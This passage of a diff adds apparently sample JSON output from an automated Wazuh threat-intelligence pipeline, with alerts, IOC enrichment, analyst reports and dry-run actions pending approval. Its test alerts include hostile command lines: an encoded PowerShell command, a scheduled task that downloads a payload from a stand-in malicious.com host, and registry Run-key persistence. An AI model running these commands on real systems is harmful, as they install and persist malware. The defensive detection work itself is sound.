*Rationale:* PowerShell is the most common Windows scripting engine for downloading, executing, and obfuscating code.\n\n2. **T1105 \u2013 Remote File Copy**  \n   *Rationale:* Adversaries often transfer malicious binaries or scripts after establishing a command interpreter.\n\n3. **T1059.003 \u2013 Windows Command Shell**  \n   *Rationale:* A fallback or secondary interpreter for executing system commands.\n\nThese predictions are speculative and should be treated as guidance for monitoring rather than definitive evidence.\n\n---\n\n## Recommendations\n\n| Category | Action |\n|----------|--------|\n| **Detection** | \u2022 Enable Wazuh rules for suspicious command execution (e.g., `powershell.exe`, `cmd.exe` with unusual arguments).<br>\u2022 Correlate Wazuh alerts with Sysmon or Windows Event Logs for process creation and command\u2011line data.<br>\u2022 Deploy file integrity monitoring on critical system binaries. |\n| **Monitoring** | \u2022 Watch for outbound connections to untrusted IPs or domains (indicative of T1105).<br>\u2022 Monitor for scheduled tasks or services created by PowerShell scripts. |\n| **Mitigation** | \u2022 Enforce least\u2011privilege for accounts that can run scripts.<br>\u2022 Apply application whitelisting and code\u2011signing enforcement.<br>\u2022 Harden PowerShell execution policy (e.g., `AllSigned`). |\n| **Response** | \u2022 If suspicious PowerShell activity is detected, isolate the host and perform a forensic analysis of the PowerShell history and script files.<br>\u2022 Conduct a network sweep for lateral movement indicators. |\n| **Reporting** | \u2022 Log all Wazuh alerts with detailed context (process ID, command line, parent process).<br>\u2022 Maintain an incident timeline for future correlation. |\n\n---\n\n### Closing Notes\nThe current evidence is insufficient to confirm malicious activity.  The low confidence mapping to T1059 suggests a potential false positive.  Continued vigilance and enhanced logging are essential to detect any subsequent adversary actions that may follow the predicted techniques.",
+    "actions_taken": [
+      {
+        "action": {
+          "action_type": "notify_analyst",
+          "target": "wazuh.manager",
+          "severity": "medium",
+          "rationale": "Two low\u2011confidence alerts (confidence 0.2) on host wazuh.manager indicate potential use of a command\u2011line or scripting interpreter (T1059). No additional process, command line, or network activity was captured, so no disruptive actions are warranted at this time. Analysts should investigate the host for hidden or scheduled scripts and verify that no unauthorized command execution is occurring.",
+          "technique_id": "T1059",
+          "confidence": 0.2
+        },
+        "status": "pending_approval",
+        "detail": "Awaiting human approval (run actions/review_pending.py).",
+        "dry_run": true
+      }
+    ],
+    "errors": [],
+    "metadata": {}
+  },
+  {
+    "raw_events": [
+      {
+        "timestamp": "2026-07-18T08:06:36.757+0000",
+        "rule": {
+          "level": 3,
+          "description": "Wazuh server started.",
+          "id": "502",
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "ossec"
+          ],
+          "pci_dss": [
+            "10.6.1"
+          ],
+          "gpg13": [
+            "10.1"
+          ],
+          "gdpr": [
+            "IV_35.7.d"
+          ],
+          "hipaa": [
+            "164.312.b"
+          ],
+          "nist_800_53": [
+            "AU.6"
+          ],
+          "tsc": [
+            "CC7.2",
+            "CC7.3"
+          ]
+        },
+        "agent": {
+          "id": "000",
+          "name": "wazuh.manager"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1784361996.0",
+        "full_log": "ossec: Manager started.",
+        "decoder": {
+          "name": "ossec"
+        },
+        "location": "wazuh-monitord"
+      },
+      {
+        "timestamp": "2026-07-18T11:33:08.667+0000",
+        "rule": {
+          "level": 3,
+          "description": "Wazuh server started.",
+          "id": "502",
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "ossec"
+          ],
+          "pci_dss": [
+            "10.6.1"
+          ],
+          "gpg13": [
+            "10.1"
+          ],
+          "gdpr": [
+            "IV_35.7.d"
+          ],
+          "hipaa": [
+            "164.312.b"
+          ],
+          "nist_800_53": [
+            "AU.6"
+          ],
+          "tsc": [
+            "CC7.2",
+            "CC7.3"
+          ]
+        },
+        "agent": {
+          "id": "000",
+          "name": "wazuh.manager"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1784374388.241",
+        "full_log": "ossec: Manager started.",
+        "decoder": {
+          "name": "ossec"
+        },
+        "location": "wazuh-monitord"
+      }
+    ],
+    "events": [
+      {
+        "event_id": "621b1b93-e190-4d39-9834-2059f32530b5",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T08:06:36.757+0000",
+        "host": "wazuh.manager",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 3,
+        "rule_description": "Wazuh server started.",
+        "rule_level": 3,
+        "rule_groups": [
+          "ossec"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "timestamp": "2026-07-18T08:06:36.757+0000",
+          "rule": {
+            "level": 3,
+            "description": "Wazuh server started.",
+            "id": "502",
+            "firedtimes": 1,
+            "mail": false,
+            "groups": [
+              "ossec"
+            ],
+            "pci_dss": [
+              "10.6.1"
+            ],
+            "gpg13": [
+              "10.1"
+            ],
+            "gdpr": [
+              "IV_35.7.d"
+            ],
+            "hipaa": [
+              "164.312.b"
+            ],
+            "nist_800_53": [
+              "AU.6"
+            ],
+            "tsc": [
+              "CC7.2",
+              "CC7.3"
+            ]
+          },
+          "agent": {
+            "id": "000",
+            "name": "wazuh.manager"
+          },
+          "manager": {
+            "name": "wazuh.manager"
+          },
+          "id": "1784361996.0",
+          "full_log": "ossec: Manager started.",
+          "decoder": {
+            "name": "ossec"
+          },
+          "location": "wazuh-monitord"
+        }
+      },
+      {
+        "event_id": "36ff150f-6837-4710-bfab-cbfa94823de2",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T11:33:08.667+0000",
+        "host": "wazuh.manager",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 3,
+        "rule_description": "Wazuh server started.",
+        "rule_level": 3,
+        "rule_groups": [
+          "ossec"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "timestamp": "2026-07-18T11:33:08.667+0000",
+          "rule": {
+            "level": 3,
+            "description": "Wazuh server started.",
+            "id": "502",
+            "firedtimes": 1,
+            "mail": false,
+            "groups": [
+              "ossec"
+            ],
+            "pci_dss": [
+              "10.6.1"
+            ],
+            "gpg13": [
+              "10.1"
+            ],
+            "gdpr": [
+              "IV_35.7.d"
+            ],
+            "hipaa": [
+              "164.312.b"
+            ],
+            "nist_800_53": [
+              "AU.6"
+            ],
+            "tsc": [
+              "CC7.2",
+              "CC7.3"
+            ]
+          },
+          "agent": {
+            "id": "000",
+            "name": "wazuh.manager"
+          },
+          "manager": {
+            "name": "wazuh.manager"
+          },
+          "id": "1784374388.241",
+          "full_log": "ossec: Manager started.",
+          "decoder": {
+            "name": "ossec"
+          },
+          "location": "wazuh-monitord"
+        }
+      }
+    ],
+    "iocs": [
+      {
+        "value": "wazuh.manager",
+        "ioc_type": "domain",
+        "reputation": "unknown",
+        "confidence": 0.0,
+        "tags": [],
+        "first_seen": null,
+        "last_seen": null,
+        "source": "",
+        "evidence": [],
+        "raw": {
+          "type": "domain",
+          "value": "wazuh.manager",
+          "source_event_id": "621b1b93-e190-4d39-9834-2059f32530b5",
+          "confidence": 1.0
+        }
+      }
+    ],
+    "techniques": [],
+    "campaign": {
+      "campaign_id": "e7b3f9c2-4d1a-4f6b-9c3e-2a1f5d8b7c9e",
+      "name": "Unclassified Activity",
+      "objective": "Unknown",
+      "timeline": [
+        {
+          "timestamp": "Unknown",
+          "event_id": "621b1b93-e190-4d39-9834-2059f32530b5",
+          "description": "wazuh_alert event generated on host wazuh.manager with no process, command line, source IP, or destination IP information."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "36ff150f-6837-4710-bfab-cbfa94823de2",
+          "description": "wazuh_alert event generated on host wazuh.manager with no process, command line, source IP, or destination IP information."
+        }
+      ],
+      "related_techniques": [],
+      "evidence_summary": "The evidence consists of two wazuh_alert events (IDs 621b1b93-e190-4d39-9834-2059f32530b5 and 36ff150f-6837-4710-bfab-cbfa94823de2) both originating from the host wazuh.manager. No additional process, command line, or network details are provided. An IOC entry lists the value wazuh.manager with unknown type, reputation, and confidence. No ATT&CK techniques are mapped in the evidence.",
+      "confidence": 0.1
+    },
+    "prediction": {
+      "likely_next_techniques": [],
+      "rationale": "No techniques observed yet."
+    },
+    "report": "# Threat Intelligence Report  \n**Campaign ID:** `e7b3f9c2-4d1a-4f6b-9c3e-2a1f5d8b7c9e`  \n**Report Date:** 2026\u201107\u201118  \n\n---\n\n## Executive Summary  \nThe investigation uncovered two Wazuh alert events indicating that the Wazuh manager service was started twice on the host `wazuh.manager`. No additional process, command\u2011line, or network activity was logged. The only indicator of compromise (IOC) identified is the domain name `wazuh.manager`, which is a legitimate internal host. No ATT&CK techniques were mapped, and the campaign confidence remains low (0.1).  \n\n**Conclusion:** The events represent routine system activity with no evidence of malicious intent. The campaign is currently unclassified and requires continued monitoring.\n\n---\n\n## Timeline  \n\n| Timestamp (UTC) | Event ID | Host | Description |\n|-----------------|----------|------|-------------|\n| 2026\u201107\u201118T08:06:36.757 | 621b1b93\u2011e190\u20114d39\u20119834\u20112059f32530b5 | wazuh.manager | Wazuh server started (rule 502, level\u202f3). |\n| 2026\u201107\u201118T11:33:08.667 | 36ff150f\u20116837\u20114710\u2011fbab\u2011cbfa94823de2 | wazuh.manager | Wazuh server started (rule 502, level\u202f3). |\n\n*Both events were generated by the Wazuh manager itself and contain no payload beyond the start notification.*\n\n---\n\n## IOCs  \n\n| Value | Type | Confidence | Source Event | Notes |\n|-------|------|------------|--------------|-------|\n| `wazuh.manager` | domain | 0.0 (unknown) | 621b1b93\u2011e190\u20114d39\u20119834\u20112059f32530b5 | Legitimate internal host; no malicious activity detected. |\n\n---\n\n## ATT&CK Techniques  \nNo ATT&CK techniques were identified in the available data.  \n\n---\n\n## Campaign Assessment  \n\n| Attribute | Value |\n|-----------|-------|\n| **Name** | Unclassified Activity |\n| **Objective** | Unknown |\n| **Confidence** | 0.1 (low) |\n| **Evidence Summary** | Two routine Wazuh start\u2011up alerts; no malicious indicators. |\n| **Related Techniques** | None |\n\n**Risk Rating:** Very Low \u2013 the activity is consistent with normal operational behavior.\n\n---\n\n## Predicted Next Steps  \n| Likely Next Technique | Rationale |\n|-----------------------|-----------|\n| None | No malicious activity observed; no patterns to extrapolate. |\n\n---\n\n## Recommendations  \n\n1. **Maintain Baseline Monitoring**  \n   * Continue to collect and review Wazuh logs for anomalous events.  \n   * Verify that the Wazuh manager is running with the expected configuration and that no unauthorized restarts occur.\n\n2. **Validate Host Integrity**  \n   * Run integrity checks (e.g., file hash verification, configuration drift analysis) on `wazuh.manager`.  \n   * Ensure that the host is not compromised by performing a quick malware scan.\n\n3. **Enhance Logging Context**  \n   * Configure Wazuh to capture additional context (e.g., process tree, network connections) for future start\u2011up events to aid in distinguishing legitimate restarts from potential tampering.\n\n4. **Cross\u2011Reference with Other Data Sources**  \n   * Correlate these events with other security tools (SIEM, IDS/IPS, endpoint protection) to rule out hidden malicious activity.\n\n5. **Document and Review**  \n   * Record this investigation in the incident log and review it during the next security operations meeting to confirm that no new indicators emerge.\n\n---\n\n**Prepared by:**  \nSenior Threat Intelligence Analyst  \n[Organization]  \n\n---",
+    "actions_taken": [
+      {
+        "action": {
+          "action_type": "notify_analyst",
+          "target": "wazuh.manager",
+          "severity": "low",
+          "rationale": "Two wazuh_alert events were generated on host wazuh.manager with no process, command line, source IP, or destination IP information. No ATT&CK techniques or additional indicators are mapped, and the IOC confidence is low. No disruptive action is warranted at this time; further investigation is required.",
+          "technique_id": "",
+          "confidence": 0.1
+        },
+        "status": "pending_approval",
+        "detail": "Awaiting human approval (run actions/review_pending.py).",
+        "dry_run": true
+      }
+    ],
+    "errors": [],
+    "metadata": {}
+  },
+  {
+    "raw_events": [
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:15:00Z",
+        "rule": {
+          "level": 10,
+          "description": "PowerShell encoded command execution",
+          "groups": [
+            "windows",
+            "powershell",
+            "attack"
+          ],
+          "id": "100100"
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07",
+          "ip": "192.168.1.100"
+        },
+        "id": "15750000-0000-0000-0000-000000000001",
+        "full_log": "powershell.exe -enc JABzAD0ATgBpAGUAdABzAC4AVABlAHMAdAA7ACAAJABzACAAPQAgACIAVABlAHMAdAAiADsAIAAkAHMA",
+        "location": "WORKSTATION-07"
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:16:32Z",
+        "rule": {
+          "level": 12,
+          "description": "Suspicious outbound connection to known C2 IP",
+          "groups": [
+            "network",
+            "c2",
+            "attack"
+          ],
+          "id": "100200"
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07",
+          "ip": "192.168.1.100"
+        },
+        "id": "15750000-0000-0000-0000-000000000002",
+        "full_log": "Outbound connection from 192.168.1.100:54321 to 185.44.12.7:443",
+        "data": {
+          "srcip": "192.168.1.100",
+          "dstip": "185.44.12.7",
+          "dstport": 443,
+          "protocol": "tcp"
+        },
+        "location": "WORKSTATION-07"
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:17:10Z",
+        "rule": {
+          "level": 8,
+          "description": "New scheduled task created",
+          "groups": [
+            "persistence",
+            "windows",
+            "attack"
+          ],
+          "id": "100300"
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07",
+          "ip": "192.168.1.100"
+        },
+        "id": "15750000-0000-0000-0000-000000000003",
+        "full_log": "schtasks.exe /create /tn 'UpdateTask' /tr 'powershell.exe -c Invoke-WebRequest http://malicious.com/payload.exe' /sc daily",
+        "location": "WORKSTATION-07"
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:18:45Z",
+        "rule": {
+          "level": 7,
+          "description": "File creation in suspicious directory",
+          "groups": [
+            "file",
+            "attack"
+          ],
+          "id": "100400"
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07",
+          "ip": "192.168.1.100"
+        },
+        "id": "15750000-0000-0000-0000-000000000004",
+        "full_log": "File created: C:\\Windows\\Temp\\payload.exe by process powershell.exe (PID 4567)",
+        "data": {
+          "filename": "payload.exe",
+          "path": "C:\\Windows\\Temp\\payload.exe",
+          "process": "powershell.exe",
+          "pid": 4567
+        },
+        "location": "WORKSTATION-07"
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:20:00Z",
+        "rule": {
+          "level": 9,
+          "description": "Registry modification for persistence",
+          "groups": [
+            "registry",
+            "persistence",
+            "attack"
+          ],
+          "id": "100500"
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07",
+          "ip": "192.168.1.100"
+        },
+        "id": "15750000-0000-0000-0000-000000000005",
+        "full_log": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 'WindowsUpdate' /t REG_SZ /d 'C:\\Windows\\Temp\\payload.exe'",
+        "data": {
+          "registry_key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "value_name": "WindowsUpdate",
+          "value_data": "C:\\Windows\\Temp\\payload.exe"
+        },
+        "location": "WORKSTATION-07"
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:22:15Z",
+        "rule": {
+          "level": 11,
+          "description": "Multiple failed login attempts from external IP",
+          "groups": [
+            "authentication",
+            "brute-force",
+            "attack"
+          ],
+          "id": "100600"
+        },
+        "agent": {
+          "id": "002",
+          "name": "SERVER-01",
+          "ip": "192.168.1.200"
+        },
+        "id": "15750000-0000-0000-0000-000000000006",
+        "full_log": "Failed login attempt from 203.0.113.50 to SERVER-01 (user: admin) - 5 attempts in 1 minute",
+        "data": {
+          "srcip": "203.0.113.50",
+          "dstip": "192.168.1.200",
+          "user": "admin",
+          "attempts": 5
+        },
+        "location": "SERVER-01"
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:25:30Z",
+        "rule": {
+          "level": 6,
+          "description": "Suspicious process injection detected",
+          "groups": [
+            "process",
+            "injection",
+            "attack"
+          ],
+          "id": "100700"
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07",
+          "ip": "192.168.1.100"
+        },
+        "id": "15750000-0000-0000-0000-000000000007",
+        "full_log": "Process injection detected: svchost.exe injected into notepad.exe (PID 7890)",
+        "data": {
+          "parent_process": "svchost.exe",
+          "target_process": "notepad.exe",
+          "pid": 7890
+        },
+        "location": "WORKSTATION-07"
+      }
+    ],
+    "events": [
+      {
+        "event_id": "aaa3b2a1-3afe-406e-be46-156ca7988e66",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:15:00Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 10,
+        "rule_description": "PowerShell encoded command execution",
+        "rule_level": 10,
+        "rule_groups": [
+          "windows",
+          "powershell",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:15:00Z",
+          "rule": {
+            "level": 10,
+            "description": "PowerShell encoded command execution",
+            "groups": [
+              "windows",
+              "powershell",
+              "attack"
+            ],
+            "id": "100100"
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07",
+            "ip": "192.168.1.100"
+          },
+          "id": "15750000-0000-0000-0000-000000000001",
+          "full_log": "powershell.exe -enc JABzAD0ATgBpAGUAdABzAC4AVABlAHMAdAA7ACAAJABzACAAPQAgACIAVABlAHMAdAAiADsAIAAkAHMA",
+          "location": "WORKSTATION-07"
+        }
+      },
+      {
+        "event_id": "d7da3ea3-8d9b-45c9-8469-d21c3d32206a",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:16:32Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 12,
+        "rule_description": "Suspicious outbound connection to known C2 IP",
+        "rule_level": 12,
+        "rule_groups": [
+          "network",
+          "c2",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:16:32Z",
+          "rule": {
+            "level": 12,
+            "description": "Suspicious outbound connection to known C2 IP",
+            "groups": [
+              "network",
+              "c2",
+              "attack"
+            ],
+            "id": "100200"
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07",
+            "ip": "192.168.1.100"
+          },
+          "id": "15750000-0000-0000-0000-000000000002",
+          "full_log": "Outbound connection from 192.168.1.100:54321 to 185.44.12.7:443",
+          "data": {
+            "srcip": "192.168.1.100",
+            "dstip": "185.44.12.7",
+            "dstport": 443,
+            "protocol": "tcp"
+          },
+          "location": "WORKSTATION-07"
+        }
+      },
+      {
+        "event_id": "08a59ea7-5bda-4f89-9f31-de0a9b6ac0b3",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:17:10Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 8,
+        "rule_description": "New scheduled task created",
+        "rule_level": 8,
+        "rule_groups": [
+          "persistence",
+          "windows",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:17:10Z",
+          "rule": {
+            "level": 8,
+            "description": "New scheduled task created",
+            "groups": [
+              "persistence",
+              "windows",
+              "attack"
+            ],
+            "id": "100300"
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07",
+            "ip": "192.168.1.100"
+          },
+          "id": "15750000-0000-0000-0000-000000000003",
+          "full_log": "schtasks.exe /create /tn 'UpdateTask' /tr 'powershell.exe -c Invoke-WebRequest http://malicious.com/payload.exe' /sc daily",
+          "location": "WORKSTATION-07"
+        }
+      },
+      {
+        "event_id": "69fecab2-64cc-4eb3-b9b7-82497416db69",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:18:45Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 7,
+        "rule_description": "File creation in suspicious directory",
+        "rule_level": 7,
+        "rule_groups": [
+          "file",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:18:45Z",
+          "rule": {
+            "level": 7,
+            "description": "File creation in suspicious directory",
+            "groups": [
+              "file",
+              "attack"
+            ],
+            "id": "100400"
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07",
+            "ip": "192.168.1.100"
+          },
+          "id": "15750000-0000-0000-0000-000000000004",
+          "full_log": "File created: C:\\Windows\\Temp\\payload.exe by process powershell.exe (PID 4567)",
+          "data": {
+            "filename": "payload.exe",
+            "path": "C:\\Windows\\Temp\\payload.exe",
+            "process": "powershell.exe",
+            "pid": 4567
+          },
+          "location": "WORKSTATION-07"
+        }
+      },
+      {
+        "event_id": "58b99c1f-6858-42cf-b0fe-dac53832ecb7",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:20:00Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 9,
+        "rule_description": "Registry modification for persistence",
+        "rule_level": 9,
+        "rule_groups": [
+          "registry",
+          "persistence",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:20:00Z",
+          "rule": {
+            "level": 9,
+            "description": "Registry modification for persistence",
+            "groups": [
+              "registry",
+              "persistence",
+              "attack"
+            ],
+            "id": "100500"
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07",
+            "ip": "192.168.1.100"
+          },
+          "id": "15750000-0000-0000-0000-000000000005",
+          "full_log": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 'WindowsUpdate' /t REG_SZ /d 'C:\\Windows\\Temp\\payload.exe'",
+          "data": {
+            "registry_key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "value_name": "WindowsUpdate",
+            "value_data": "C:\\Windows\\Temp\\payload.exe"
+          },
+          "location": "WORKSTATION-07"
+        }
+      },
+      {
+        "event_id": "35b9cee6-2212-456f-aa57-c587e59e8ea1",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:22:15Z",
+        "host": "SERVER-01",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 11,
+        "rule_description": "Multiple failed login attempts from external IP",
+        "rule_level": 11,
+        "rule_groups": [
+          "authentication",
+          "brute-force",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:22:15Z",
+          "rule": {
+            "level": 11,
+            "description": "Multiple failed login attempts from external IP",
+            "groups": [
+              "authentication",
+              "brute-force",
+              "attack"
+            ],
+            "id": "100600"
+          },
+          "agent": {
+            "id": "002",
+            "name": "SERVER-01",
+            "ip": "192.168.1.200"
+          },
+          "id": "15750000-0000-0000-0000-000000000006",
+          "full_log": "Failed login attempt from 203.0.113.50 to SERVER-01 (user: admin) - 5 attempts in 1 minute",
+          "data": {
+            "srcip": "203.0.113.50",
+            "dstip": "192.168.1.200",
+            "user": "admin",
+            "attempts": 5
+          },
+          "location": "SERVER-01"
+        }
+      },
+      {
+        "event_id": "db3d34d2-eb7e-4b63-9825-230cb986eaa9",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:25:30Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 6,
+        "rule_description": "Suspicious process injection detected",
+        "rule_level": 6,
+        "rule_groups": [
+          "process",
+          "injection",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:25:30Z",
+          "rule": {
+            "level": 6,
+            "description": "Suspicious process injection detected",
+            "groups": [
+              "process",
+              "injection",
+              "attack"
+            ],
+            "id": "100700"
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07",
+            "ip": "192.168.1.100"
+          },
+          "id": "15750000-0000-0000-0000-000000000007",
+          "full_log": "Process injection detected: svchost.exe injected into notepad.exe (PID 7890)",
+          "data": {
+            "parent_process": "svchost.exe",
+            "target_process": "notepad.exe",
+            "pid": 7890
+          },
+          "location": "WORKSTATION-07"
+        }
+      }
+    ],
+    "iocs": [
+      {
+        "value": "185.44.12.7",
+        "ioc_type": "ip",
+        "reputation": "benign",
+        "confidence": 0.0,
+        "tags": [
+          "country:RU",
+          "data_center/web_hosting/transit",
+          "domain:atomdata.ru",
+          "isp:ATOMDATA JSC"
+        ],
+        "first_seen": null,
+        "last_seen": null,
+        "source": "AbuseIPDB",
+        "evidence": [
+          {
+            "provider": "AbuseIPDB",
+            "raw_response": {
+              "ipAddress": "185.44.12.7",
+              "isPublic": true,
+              "ipVersion": 4,
+              "isWhitelisted": false,
+              "abuseConfidenceScore": 0,
+              "countryCode": "RU",
+              "usageType": "Data Center/Web Hosting/Transit",
+              "isp": "ATOMDATA JSC",
+              "domain": "atomdata.ru",
+              "hostnames": [],
+              "isTor": false,
+              "countryName": "Russian Federation",
+              "totalReports": 0,
+              "numDistinctUsers": 0,
+              "lastReportedAt": null,
+              "reports": []
+            },
+            "queried_at": "2026-07-18 11:51:12.155835"
+          }
+        ],
+        "raw": {
+          "type": "ipv4",
+          "value": "185.44.12.7",
+          "source_event_id": "d7da3ea3-8d9b-45c9-8469-d21c3d32206a",
+          "confidence": 1.0
+        }
+      },
+      {
+        "value": "http://malicious.com/payload.exe",
+        "ioc_type": "url",
+        "reputation": "unknown",
+        "confidence": 0.0,
+        "tags": [],
+        "first_seen": null,
+        "last_seen": null,
+        "source": "",
+        "evidence": [],
+        "raw": {
+          "type": "url",
+          "value": "http://malicious.com/payload.exe",
+          "source_event_id": "08a59ea7-5bda-4f89-9f31-de0a9b6ac0b3",
+          "confidence": 1.0
+        }
+      },
+      {
+        "value": "203.0.113.50",
+        "ioc_type": "ip",
+        "reputation": "suspicious",
+        "confidence": 0.0,
+        "tags": [
+          "non_public",
+          "reserved"
+        ],
+        "first_seen": null,
+        "last_seen": "2026-07-09T02:07:30+00:00",
+        "source": "AbuseIPDB",
+        "evidence": [
+          {
+            "provider": "AbuseIPDB",
+            "raw_response": {
+              "ipAddress": "203.0.113.50",
+              "isPublic": false,
+              "ipVersion": 4,
+              "isWhitelisted": true,
+              "abuseConfidenceScore": 0,
+              "countryCode": null,
+              "usageType": "Reserved",
+              "isp": null,
+              "domain": null,
+              "hostnames": [],
+              "isTor": false,
+              "countryName": null,
+              "totalReports": 8,
+              "numDistinctUsers": 7,
+              "lastReportedAt": "2026-07-09T02:07:30+00:00",
+              "reports": [
+                {
+                  "reportedAt": "2026-07-09T02:07:30+00:00",
+                  "comment": "Auto-report: canary:pipe_e | sources=[\"canary\"] | Fox honeypot cluster",
+                  "categories": [
+                    21
+                  ],
+                  "reporterId": 325144,
+                  "reporterCountryCode": "CN",
+                  "reporterCountryName": "China"
+                },
+                {
+                  "reportedAt": "2026-07-06T05:12:01+00:00",
+                  "comment": "Auto-report: canary:pipe_a | sources=[\"canary\"] | Fox honeypot cluster",
+                  "categories": [
+                    21
+                  ],
+                  "reporterId": 325144,
+                  "reporterCountryCode": "DE",
+                  "reporterCountryName": "Germany"
+                },
+                {
+                  "reportedAt": "2026-07-04T18:33:26+00:00",
+                  "comment": "...",
+                  "categories": [
+                    18,
+                    22
+                  ],
+                  "reporterId": 300408,
+                  "reporterCountryCode": "BR",
+                  "reporterCountryName": "Brazil"
+                },
+                {
+                  "reportedAt": "2026-06-17T18:15:43+00:00",
+                  "comment": "Auto-Ban [2026-06-17 18:15:43]: CRITICAL: bot trap (soft) | host=aulageo.com | route=/wp-content/plugins/fix/up.php | hits=1 | ua=wpscan",
+                  "categories": [
+                    15,
+                    21
+                  ],
+                  "reporterId": 18988,
+                  "reporterCountryCode": "FR",
+                  "reporterCountryName": "France"
+                },
+                {
+                  "reportedAt": "2026-06-10T14:20:03+00:00",
+                  "comment": "Apache monitor: web_attack_payload",
+                  "categories": [
+                    18,
+                    22
+                  ],
+                  "reporterId": 238548,
+                  "reporterCountryCode": "SE",
+                  "reporterCountryName": "Sweden"
+                },
+                {
+                  "reportedAt": "2026-06-05T08:01:35+00:00",
+                  "comment": "Suspicious activity detected - automated scan",
+                  "categories": [
+                    18,
+                    22
+                  ],
+                  "reporterId": 273802,
+                  "reporterCountryCode": "IN",
+                  "reporterCountryName": "India"
+                },
+                {
+                  "reportedAt": "2026-06-05T08:01:35+00:00",
+                  "comment": "Suspicious activity detected - automated scan",
+                  "categories": [
+                    18,
+                    22
+                  ],
+                  "reporterId": 247613,
+                  "reporterCountryCode": "IN",
+                  "reporterCountryName": "India"
+                },
+                {
+                  "reportedAt": "2026-04-28T15:10:44+00:00",
+                  "comment": "Observed repeated SSH brute-force login attempts against SSH service (multiple failed authentication attempts over a short period).",
